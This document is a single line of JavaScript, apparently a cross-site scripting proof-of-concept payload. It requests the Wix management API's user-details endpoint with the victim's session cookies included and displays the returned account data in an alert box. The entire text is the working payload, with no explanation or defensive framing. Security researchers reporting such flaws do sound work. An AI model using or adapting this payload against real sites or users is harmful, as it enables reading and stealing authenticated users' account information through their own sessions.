fetch('https://manage.wix.com/_api/wix-html-login-webapp/user/getUserDetails',{credentials:'include'}).then(r=>r.text()).then(a=>alert(a))
